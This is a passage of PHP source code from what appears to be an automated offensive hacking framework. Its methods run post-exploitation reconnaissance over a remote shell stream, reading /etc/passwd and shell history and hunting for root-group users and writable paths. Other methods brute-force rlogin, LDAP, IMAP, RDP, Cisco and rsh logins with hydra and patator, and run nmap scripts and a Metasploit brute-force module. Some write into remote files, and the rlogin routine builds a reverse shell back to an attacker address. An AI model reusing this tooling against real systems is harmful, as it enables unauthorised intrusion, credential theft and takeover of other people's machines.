	                list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context,$id8str) = $this->parse4id($rst);
	                $id8b64 = base64_encode($id8str);
	                $this->article("CREATE Template ID", $template_id);
	                $template_shell = base64_decode($templateB64_shell);
	                $this->article("CREATE Template SHELL", $template_shell);
	                
	                $obj_lan = new lan4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $stream,$templateB64_id,$templateB64_shell,$id8b64);
	                var_dump($this->flag_poc);
	                $obj_lan->poc($this->flag_poc);
	                var_dump($obj_lan->flag_poc);
	                $obj_lan->lan2root();
	                break ;
	        }
	        fclose($stream);
	        fclose($socket8server);
	        
	    }
	    echo $result;
	    return $result;
	}
	
	
	
	
	public function env2path2info($stream){
	    $data = "cat /etc/environment";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    $data = "systemctl show-environment";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    $data = "echo \$PATH ";
	    return $this->req_str($stream,$data,$this->stream_timeout,"");
	}
	
	public function host2info($stream){
	    
	    $this->titre(__FUNCTION__);
	    
	    $data = "id ";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $data = "/usr/bin/id ";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    
	    $data = "echo \$LOGNAME ";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $this->note("logged on");
	    $data = "who 2>/dev/null";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $data = "w 2>/dev/null";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    
	    $this->note("Users that have previously logged onto the system");
	    $data = "lastlog 2>/dev/null";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $data = "last 2>/dev/null";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $this->note("What has the user being doing? Is there any password in plain text? What have they been edting?");
	    $data = "history";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $data = "date";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $data = "uname -a";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    
	    
	    $data = "echo \$PWD ";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $data = "echo \$HOME ";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    
	    $data = "echo \$SESSION";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $data = "echo \$TERM";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $data = "echo \$SHELL ";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $data = "echo $0";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $data = "echo \$BASH_VERSION";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $data = "\$SHELL --version";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    
	    
	    $data = "cat /etc/passwd ";
	    $strings_etc_passwd = $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $this->parse4etc_passwd($strings_etc_passwd);
	    
	    $this->users2gid_root();
	    
	    
	    
	    
	    
	    $data = "echo \$JOB ";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $data = "echo \$DISPLAY ";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    
	    
	    
	    $this->note("checks to see if roots home directory is accessible");
	    $data = "ls -ahl /root/ 2>/dev/null";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $this->note("Accounts that have recently used sudo");
	    $data = "find /home -name .sudo_as_admin_successful 2>/dev/null";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    
	    $data = "groups";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $data = "grep -E '^UID_MIN|^UID_MAX' /etc/login.defs";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $this->ssTitre("World-readable files within /home");
	    $data = "find /home/ -perm -4 -type f -exec ls -al {} \; 2>/dev/null";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $this->note("Noowner files");
	    $data = "find / -xdev \( -nouser -o -nogroup \) -print 2>/dev/null";
	    $this->req_str($stream,$data,$this->stream_timeout*3,"");
	    
	    $data = "find / -writable -type d 2>/dev/null";
	    $this->req_str($stream,$data,$this->stream_timeout*3,"");
	    
	    $data = "find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print 2>/dev/null";
	    $this->req_str($stream,$data,$this->stream_timeout*3,"");
	    
	    
	    $data = "grep -v -e '^$' /etc/hosts /etc/resolv.conf  | grep -v '^#' | sort -u 2>/dev/null";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $data = "dnsdomainname";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    
	    
	    $this->note("Provides a list of active connections.
Can be used to determine what ports are listening on the server");
	    $data = "cat /proc/net/tcp";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $data = "cat /proc/net/udp";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $this->note("This is used for route caching.
This can also be used to determine local IPs, as well as gain a better understanding of the target's networking structure");
	    $data = "cat /proc/net/fib_trie";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    
	    $this->note("listening TCP");
	    $data = "netstat -antp 2>/dev/null";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $data = "ss -t 2>/dev/null";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    
	    $this->note("listening UDP");
	    $data = "netstat -anup 2>/dev/null";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $data = "ss -u 2>/dev/null";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $data = "find / -executable -user $this->uid_name ! -group $this->uid_name -type f ! -path \"/proc/*\" ! -path \"/sys/*\" -exec ls -al {} \; 2>/dev/null";
	    $this->req_str($stream,$data,$this->stream_timeout*3,"");
	    
	}
	
	public function whoami($stream){
	    $username_found = "";
	    $rst = $this->id();
	    list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
	    return $uid_name;
	}
	
	public function id($stream){
	    $data = "id";
	    return $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	}
	
	public function ip4wan($stream){
	    $data = "wget http://ipecho.net/plain -O - -q ; echo";
	    return trim($this->req_str($stream,$data,$this->stream_timeout,""));
	}
	
	
	
	public function search4app4exist($stream,$app){
	    $this->titre(__FUNCTION__);
	    $app = trim($app);
	    $data =  "which $app";
	    $app_path = trim($this->req_str($stream,$data,$this->stream_timeout,""));
	    if(stristr($app_path, "/$app")) return $app;
	    else return FALSE;
	}
	
	
	public function users2gid_root($stream){
	    
	    
	    $this->ssTitre("List of groups root ");
	    $data = "for i in $(cut -d':' -f1 /etc/passwd 2>/dev/null);do id \$i | grep 'gid=0(root)' ;done 2>/dev/null";
	    $users_all_rst = $this->req_str($stream,$data,$this->stream_timeout,"");
	    $results = array();
	    
	    $users_tmp = explode("\n",$users_all_rst);
	    foreach ($users_tmp as $line ){
	        $this->article("line", $line);
	        if (preg_match('/uid=(?<uid>[0-9]{1,5})\((?<username>[0-9a-zA-Z_\-]{1,})\) gid=0\(root\)/',$line,$results))  {
	            if(!empty($results)){
	                $this->tab_users_gid_root[] = $results['username'] ;
	            }
	            
	        }
	        unset($results);
	    }
	    
	    
	    echo $this->tab($this->tab_users_gid_root);
	    
	    $this->ssTitre("Group memberships");
	    $data = "for i in $(cut -d':' -f1 /etc/passwd 2>/dev/null);do id \$i;done 2>/dev/null";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $this->ssTitre("look for adm group");
	    $data = "for i in $(cut -d':' -f1 /etc/passwd 2>/dev/null);do id \$i;done | grep \"(adm)\" 2>/dev/null";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $this->ssTitre("look for lxd group");
	    $data = "for i in $(cut -d':' -f1 /etc/passwd 2>/dev/null);do id \$i;done | grep \"(lxd)\" 2>/dev/null";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $this->ssTitre("look for docker group");
	    $data = "for i in $(cut -d':' -f1 /etc/passwd 2>/dev/null);do id \$i;done | grep \"(docker)\" 2>/dev/null";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    $this->ssTitre("List of users with no password");
	    $data = "cat /etc/passwd | awk -F: '($2 != \"x\") {print}' ";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    
	    $this->ssTitre("all root accounts (uid 0)");
	    $data = "grep -v -E \"^#\" /etc/passwd 2>/dev/null | awk -F: '$3 == 0 { print $1}' 2>/dev/null";
	    $this->req_str($stream,$data,$this->stream_timeout,"");
	    
	    
	    
	}
	
	public function file4exist8name($stream,$filename):bool{
	    $this->ssTitre(__FUNCTION__);
	    $filepath = $this->file4locate($stream,$filename);
	    if (!empty($filepath)){
	        return TRUE;
	    }
	    ELSE return FALSE;
	}
	
	public function file4exist8path($stream,$filepath):bool{
	    $this->ssTitre(__FUNCTION__);
	    $filepath_found = "";
	    $data = "ls -al $filepath";
	    $filepath_found = $this->req_str($stream,$data, $this->stream_timeout,"| awk '{print $9}' $this->filter_file_path ");
	    
	    if (!empty($filepath_found)){
	        $chaine = "file exist";
	        $this->note($chaine);
	        return TRUE;
	    }
	    else {
	        $chaine = "file does not exist";
	        $this->rouge($chaine);
	        return FALSE;
	    }
	}
	
	public function file4locate($stream,$filename){
	    $this->ssTitre(__FUNCTION__);
	    
	    $data = "which $filename ";
	    $files_found = "";
	    $files_found = trim($this->req_str($stream,$data,$this->stream_timeout*3,"$this->filter_file_path | grep '$filename' "));
	    if( !empty($files_found)) return $files_found ;
	    
	    $data = "locate $filename ";
	    $files_found = "";
	    $files_found = trim($this->req_str($stream,$data,$this->stream_timeout*3,"$this->filter_file_path | grep '$filename' "));
	    if( !empty($files_found)) return $files_found ;
	    
	    
	    $data = "find / -iname $filename -type f -exec ls {} \; 2> /dev/null ";
	    $files_found = "";
	    $files_found = trim($this->req_str($stream,$data,$this->stream_timeout*3,"$this->filter_file_path | grep '$filename' "));
	    if( !empty($files_found)) return $files_found ;
	}
	
	public function file4search8path($stream,$file_path,$search_data):bool{
	    $this->ssTitre(__FUNCTION__);
	    $search_data = trim($search_data);
	    
	    $data = "cat $file_path";
	    $lines_str = $this->req_str($stream,$data,$this->stream_timeout,"| grep '$search_data' ");
	    
	    if (strstr($lines_str, $search_data)!==FALSE)
	    {
	        $this->article($search_data, "Found ");
	        return TRUE ;
	    }
	    
	    $this->article($search_data, "Not Found");
	    return FALSE;
	}
	
	public function file4add($stream,$filename,$add_data){
	    $this->ssTitre(__FUNCTION__);
	    $obj_filename = new FILE($stream,$filename);
	    
	    if ($this->file4search8path($stream,$obj_filename->file_path, $add_data)){
	        $this->note("Already Added: $add_data");
	        return TRUE;
	    }
	    else {
	        $this->note("ADD: $add_data");
	        $this->req_str($stream,"echo '$add_data' >> $obj_filename->file_path",$this->stream_timeout,"");
	        $data = "cat $obj_filename->file_path";
	        $rst = $this->req_str($stream,$data,$this->stream_timeout,"| grep '$add_data' | grep -Po '$add_data'  ");
	        if (!empty($rst)) {$this->log2succes("SUCCES ADD: $add_data");return TRUE;}
	        else {$this->log2error("Failed ADD");return FALSE;}
	    }
	    
	}
	
	
	public function file4writable($stream,$filename){
	    $this->ssTitre(__FUNCTION__);
	    $writable_rst = array();
	    if ($this->file4exist8path($stream,$filename)){
	        $data = "stat $filename";
	        $writable_test = trim($this->req_str($stream,$data,$this->stream_timeout,""));
	        if (preg_match('/[0-7]{3}(?<user2write>[0-7]{1})\/[rwx\-]{7}/',$writable_test,$writable_rst))
	        {
	            if (isset($writable_rst['user2write'])){
	                $this->article("User Permission",$writable_rst['user2write']);
	                if ($writable_rst['user2write']>6) {
	                    $this->rouge("Writeable $filename");
	                    return TRUE;}
	                    else {$this->note("Not Writeable less 6 $filename");return FALSE;}
	            }
	        }
	        else {$this->note("Not Writeable $filename");return FALSE;}
	    }
	}
	
	public function file4readable($stream,$filename){
	    $this->ssTitre(__FUNCTION__);
	    $readable_rst = array();
	    $data = "stat $filename";
	    $readable_test = trim($this->req_str($stream,$data,$this->stream_timeout,""));
	    if (preg_match('/[0-7]{3}(?<user2read>[0-7]{1})\/[rwx\-]{7}/',$readable_test,$readable_rst))
	    {
	        if (isset($readable_rst['user2read'])){
	            $this->article("readable",$readable_rst['user2read']);
	            if ($readable_rst['user2read']>4) {
	                $this->note("readable $filename");
	                return TRUE;}
	                
	        }
	    }
	    else {$this->note("Not readable $filename");return FALSE;}
	}
	
	
	
	public function file4replace($stream,$filename,$search_data,$replace_data){
	    $result = "";
	    $this->ssTitre(__FUNCTION__);
	    $obj_filename = new FILE($stream,$filename);
	    
	    if ($this->file4search8path($stream,$obj_filename->file_path,$search_data)){
	        $data = "cat $obj_filename->file_path";
	        $lines_tab = $this->req_tab($stream,$data,$this->stream_timeout,"");
	        
	        foreach ($lines_tab as $line){
	            if (preg_match('#['.$search_data.']#',$line))
	            {
	                $this->article("Searching", "Found ");
	                $result .= str_replace($search_data, $replace_data, $line);
	            }
	            else {
	                $result .= $line;
	            }
	        }
	        
	        $this->article("Replacing", "Data ");
	        $data = "echo '$result' > $obj_filename->file_path";
	        $this->req_str($stream,$data,$this->stream_timeout,"");
	        
	    }
	    else {
	        $this->note("Data Not found: $search_data");
	    }
	    
	    return $result;
	}
	
	
	
	public function check4id8db($id8port,$templateB64_id,$id8b64):bool{
	    $sql_w = "SELECT templateB64_id FROM LAN WHERE id8port = $id8port AND templateB64_id = '$templateB64_id' AND id8b64 = '$id8b64' ";
	    echo "mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"SELECT EXISTS($sql_w);\"  2>/dev/null \n";
	    return $this->checkBD($sql_w);
	}
	
	
	
	
	
	public function service2rlogin(){
	    $this->titre(__FUNCTION__);


	    
	    $users_test = $this->ip2users4passwd();
	    if (!empty($users_test))
	    foreach ($users_test as $user_test => $user_pass){
	        $this->port2auth4pass4hydra("rlogin",$user_test,$user_pass);
	    }
	    
	    
	    $users_test = $this->ip2users4shell();
	    if (!empty($users_test))
	    foreach ($users_test as $user_test){
	        $this->port2auth4pass4hydra("rlogin",$user_test,"password");
	    }
	    

	    $users_test = array("mysql","oracle","mail","anonymous","ftp","cisco","root","admin","administrator","guest","user","test","voip");
	    foreach ($users_test as $user_test){
	        $this->port2auth4pass4hydra("rlogin",$user_test,"password");
	    }
	    
	    $attacker_ip = $this->ip4addr4target($this->ip);
	    $attacker_port = rand(1024,645535);
	    $shell = "bash";
	    $cmd_rev = $this->rev8sh($attacker_ip, $attacker_port, $shell);
	    $users_test = $this->ip2users4passwd();
	    
	    if (!empty($users_test))
	        foreach ($users_test as $user_test => $user_pass){
	        
	            $template_shell = "(echo \"\";sleep 3; %ID% ;$this->stream_timeout ;) | rlogin -l $user_test ";
	     
	            $this->service4lan($cmd_rev, base64_encode($template_shell), $attacker_port, 'T', "server");
	    }
	}
	
	
	
	public function service2banner(){
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n -Pn --reason --script \"banner\" $this->ip -p $this->port -s$this->protocol -e $this->eth -oX - | xmlstarlet sel -t -v /nmaprun/host/ports/port/script/@output | strings";
	    return trim($this->req2BD(__FUNCTION__,__CLASS__,"$this->service2where",$query));
	}
	

	

	public function service2afp(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"afp-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
	    return $this->auth2login4nmap($this->req2BD($this->colonne,$this->table,"$this->port2where AND service2name = '$this->service_name' AND service2version = '$this->service_version' ",$query),__FUNCTION__);
	}

	
	public function service2couchdb(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"couchdb-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
	    return $this->auth2login4nmap($this->req2BD($this->colonne,$this->table,"$this->port2where AND service2name = '$this->service_name' AND service2version = '$this->service_version' ",$query),__FUNCTION__);
	}
	

	public function service2db2(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"db2-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX -  ";
	    return $this->auth2login4nmap($this->req2BD($this->colonne,$this->table,"$this->port2where AND service2name = '$this->service_name' AND service2version = '$this->service_version' ",$query),__FUNCTION__);
	    
	}
	

	public function service2jdwp(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"jdwp-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth | grep -v -i 'nmap' ";
	    return $this->auth2login4nmap($this->req2BD($this->colonne,$this->table,"$this->port2where AND service2name = '$this->service_name' AND service2version = '$this->service_version' ",$query),__FUNCTION__);
	    
	}
	
	
	public function service2ldap(){
	    $result = "";
	    $result .= $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"ldap-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
	    $result .= $this->cmd("localhost",$query);
	    $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
	    
	    $users_test = array("mail","anonymous","ftp","cisco","root","admin","administrator","guest","user","test","voip");
	    foreach ($users_test as $user_test){
	        $result .= $this->port2auth4dico4hydra("ldap2",$user_test);
	        $result .= $this->port2auth4dico4hydra("ldap3",$user_test);
	    }
	    
	    $query = "patator ldap_login host=$this->ip port=$this->port binddn='cn=Directory Manager' bindpw=FILE1  1=$this->dico_password.1000 -x ignore:mesg='ldap_bind: Invalid credentials (49)' ";
	    //$result .= $this->cmd("localhost",$query); $result .= $this->req_ret_str($query);
	    // ldap_login host=10.0.0.1 binddn='cn=Directory Manager' bindpw=FILE0 0=passwords.txt -x ignore:mesg='ldap_bind: Invalid credentials (49)'
	    //ldapsearch -H ldap://IP -x -LLL -s base -b  supportedSASLMechanisms
	    
	    return $result;
	    
	}
	
	public function service2ajp(){
	    $result = "";
	    
	    $result .= $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"ajp-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
	    $result .= $this->cmd("localhost",$query);
	    $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
	    
	    $query = "patator ajp_fuzz $this->ip -p $this->port -e $this->eth -oX - ";
	    //$result .= $this->cmd("localhost",$query);$result .= $this->req_ret_str($query);
	    
	    return $result;
	}

	public function service2domcon(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"domcon-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
	    return $this->auth2login4nmap($this->req2BD($this->colonne,$this->table,"$this->port2where AND service2name = '$this->service_name' AND service2version = '$this->service_version' ",$query),__FUNCTION__);
	}
	
	

	public function service2cassandra(){
	    $result = "";
	    
	    
	    $result .= $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"cassandra-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
	    $result .= $this->cmd("localhost",$query);
	    $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
	    
	    $users_test = array("root","admin","administrator","guest","user","test");
	    foreach ($users_test as $user_test){
	        //$result .= $this->port2auth4dico4ncrack($user_test);
	    }
	    
	    
	    
	    return $result;
	}
	

	
	public function service2iscsi(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"iscsi-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
	    return $this->auth2login4nmap($this->req2BD($this->colonne,$this->table,"$this->port2where AND service2name = '$this->service_name' AND service2version = '$this->service_version' ",$query),__FUNCTION__);
	    
	}
	

	

	
	public function service2mongodb(){
	    $result = "";
	    
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"mongodb-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
	    $result .= $this->cmd("localhost",$query);
	    $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
	    
	    $users_test = array("root","admin","administrator","guest","user","test");
	    foreach ($users_test as $user_test){
	        //$result .= $this->port2auth4dico4ncrack($user_test);
	    }
	    
	    
	    return $result;
	}
	


	

	public function service2cisco(){
	    $result = "";
	    $result .= $this->ssTitre(__FUNCTION__);
	    $query = "CAT -h $this->ip -p $this->port -a $this->dico_password ";
	    $result .= $this->cmd("localhost",$query);
	    $result .= $this->req_ret_str($query);
	    
	    $users_test = array("cisco","root","admin","administrator","guest","user","test","voip");
	    foreach ($users_test as $user_test){
	        $result .= $this->port2auth4dico4hydra("cisco",$user_test);
	    }
	    
	    
	    
	    $sql_r = "select user2name,user2pass FROM AUTH where ip='$this->ip' ORDER BY user2name;";
	    $conn = $this->mysql_ressource->query($sql_r);
	    while ($row = $conn->fetch_assoc()){
	        $user2name = trim($row['user2name']);
	        $user2pass = trim($row['user2pass']);
	        $result .= $this->article("USER/PASS FOUND FOR TEST", "$user2name/$user2pass");
	        if (!empty($user2name)) $result .= $this->port2auth4pass4hydra("cisco", $user2name, $user2pass);
	    }
	    
	    return $result;
	}

	
	public function service2ident(){
	    $result = "";
	    $result .= $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"auth-owners\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
	    $result .= $this->cmd("localhost",$query);
	    $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
	    
	    
	    $query = "perl /opt/ident-user-enum/ident-user-enum.pl $this->ip $this->port";
	    $result .= $this->cmd("localhost",$query);  $result .= $this->req_ret_str($query);
	    
	    return $result;
	}
	
	
	
	public function service2informix(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"informix-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
	    return $this->auth2login4nmap($this->req2BD($this->colonne,$this->table,"$this->port2where AND service2name = '$this->service_name' AND service2version = '$this->service_version' ",$query),__FUNCTION__);
	    
	}
	
	public function service2imap(){
	    $result = "";
	    $result .= $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"imap-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
	    $result .= $this->cmd("localhost",$query);
	    $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
	    
	    $users_test = array("mail","mail-daemon","anonymous","ftp","cisco","root","admin","administrator","guest","user","test","voip");
	    foreach ($users_test as $user_test){
	        $result .= $this->port2auth4dico4hydra("imap",$user_test);
	        $query = "patator imap_login host=$this->ip port=$this->port user=$user_test password=FILE1 1=$this->dico_password.1000 -x ignore:fgrep='no such user'   ";
	        //$result .= $this->cmd("localhost",$query);$result .= $this->req_ret_str($query);
	    }
	    
	    
	    $sql_r = "select user2name,user2pass FROM AUTH where ip='$this->ip' ORDER BY user2name;";
	    $conn = $this->mysql_ressource->query($sql_r);
	    while ($row = $conn->fetch_assoc()){
	        $user2name = trim($row['user2name']);
	        $user2pass = trim($row['user2pass']);
	        $result .= $this->article("USER/PASS FOUND FOR TEST", "$user2name/$user2pass");
	        if (!empty($user2name)) $result .= $this->port2auth4pass4hydra("imap", $user2name, $user2pass);
	    }
	    
	    return $result;
	}
	
	

	
	public function service2drda(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"drda-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
	    return $this->auth2login4nmap($this->req2BD($this->colonne,$this->table,"$this->port2where AND service2name = '$this->service_name' AND service2version = '$this->service_version' ",$query),__FUNCTION__);
	    
	}

	

	
	

	
	public function service2finger(){
	    $afficheUSER = array();
	    $result = "";
	    
	    $result .= $this->ssTitre(__FUNCTION__);
	    
	    $users_tmp = file("$this->dico_users");
	    foreach ($users_tmp as $user_tmp){
	        $user_tmp = trim($user_tmp);
	        $query = "finger $user_tmp@$this->ip | grep -v '???' | grep -v 'Idle' ";
	        $check = $this->req_ret_tab($query);
	        if(!empty($check))
	            foreach ($check as $ligne){
	                if(!empty($ligne))  {
	                    if (preg_match("/(?<login>[[:print:]]\w+)([[:space:]]{1,})(?<info>[[:print:]]{1,})/", $ligne, $afficheUSER) ) {
	                        //var_dump($afficheUSER);
	                        if (isset($afficheUSER['login'])){ // faire pour plusieurs resultat
	                            $result .= $this->yesUSERS($this->port2id,$afficheUSER['login'],__FUNCTION__ ,$afficheUSER['info']);
	                        }
	                    }
	                }
	        }
	    }
	    
	    
	    //$query = "patator finger_lookup host=$this->ip port=$this->port user=FILE0 0=$this->dico_users -x ignore:fgrep='no such user'   ";
	    //$result .= $this->cmd("localhost",$query);$result .= $this->req_ret_str($query);
	    
	    return $result;
	}
	
	
	public function service2iax2(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"iax2-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX -";
	    return $this->auth2login4nmap($this->req2BD($this->colonne,$this->table,"$this->port2where AND service2name = '$this->service_name' AND service2version = '$this->service_version' ",$query),__FUNCTION__);
	    
	}
	
	

	
	public function service2rdp(){
	    $result = "";
	    
	    $result .= $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"rdp-enum-encryption,rdp-vuln-ms12-020\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
	    $result .= $this->cmd("localhost",$query);
	    $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
	    
	    
	    $users_test = array("root","admin","administrator","guest","user","test");
	    foreach ($users_test as $user_test){
	        //$result .= $this->port2auth4dico4ncrack($user_test);
	    }
	    
	    
	    $users_test = array("root","admin","administrator","guest","user","test");
	    foreach ($users_test as $user_test){
	        $result .= $this->port2auth4dico4hydra("rdp",$user_test);
	        $query = "patator rdp_login host=$this->ip port=$this->port user=$user_test password=FILE1  1=$this->dico_password.1000 -x ignore:fgrep='no such user'   ";
	        // $result .= $this->cmd("localhost",$query);$result .= $this->req_ret_str($query);
	    }
	    
	    
	    $sql_r = "select user2name,user2pass FROM AUTH where ip='$this->ip' ORDER BY user2name;";
	    $conn = $this->mysql_ressource->query($sql_r);
	    while ($row = $conn->fetch_assoc()){
	        $user2name = trim($row['user2name']);
	        $user2pass = trim($row['user2pass']);
	        $result .= $this->article("USER/PASS FOUND FOR TEST", "$user2name/$user2pass");
	        if (!empty($user2name)) $result .= $this->port2auth4pass4hydra("rdp", $user2name, $user2pass);
	    }
	    
	    return $result;
	}
	
	
	public function service2rpc(){
	    $this->ssTitre(__FUNCTION__);
	    // https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html
	    $query = "echo '$this->root_passwd' | sudo -S nmap --script rpcinfo -Pn -n --reason $this->ip -s$this->protocol -p $this->port | grep -v -i 'nmap' ";
	    return $this->auth2login4nmap($this->req2BD($this->colonne,$this->table,"$this->port2where AND service2name = '$this->service_name' AND service2version = '$this->service_version' ",$query),__FUNCTION__);
	    
	}
	
	
	public function service2sctp(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n -Pn --reason -PY -sY $this->ip -p $this->port -e $this->eth ";
	    return $this->auth2login4nmap($this->req2BD($this->colonne,$this->table,"$this->port2where AND service2name = '$this->service_name' AND service2version = '$this->service_version' ",$query),__FUNCTION__);
	    
	}
	
	
	
	public function service2shell(){
	    $result = "";
	    
	    $result .= $this->ssTitre(__FUNCTION__);
	    
	    
	    $users_test = array("root","admin","administrator","guest","user","test");
	    foreach ($users_test as $user_test){
	        $result .= $this->port2auth4dico4hydra("rsh",$user_test);
	    }
	    
	    
	    $query = "echo '$this->cmd_unix' | nc $this->ip $this->port -q 60 -v -".strtolower($this->protocol) ;
	    $result .= $this->cmd("localhost",$query);
	    $result .= $this->req_ret_str($query);
	    
	    
	    $sql_r = "select user2name,user2pass FROM AUTH where ip='$this->ip' ORDER BY user2name;";
	    $conn = $this->mysql_ressource->query($sql_r);
	    while ($row = $conn->fetch_assoc()){
	        $user2name = trim($row['user2name']);
	        $user2pass = trim($row['user2pass']);
	        $result .= $this->article("USER/PASS FOUND FOR TEST", "$user2name/$user2pass");
	        if (!empty($user2name)) $result .= $this->port2auth4pass4hydra("rsh", $user2name, $user2pass);
	    }
	    
	    
	    return $result;
	}
	
	
	public function service2tftp(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "echo \"db_status\nuse auxiliary/scanner/tftp/tftpbrute\nset RHOSTS $this->ip\nset RPORT $this->port\nset THREADS 8\nrun\nexit\n \" > $this->dir_tmp/".__FUNCTION__.".rc && echo '$this->root_passwd' | sudo -S msfconsole -q -r $this->dir_tmp/".__FUNCTION__.".rc "; // "; // -y /usr/share/metasploit-framework/config/database.yml" ;
	    return $this->auth2login4nmap($this->req2BD($this->colonne,$this->table,"$this->port2where AND service2name = '$this->service_name' AND service2version = '$this->service_version' ",$query),__FUNCTION__);
	    
	}
	
	
	
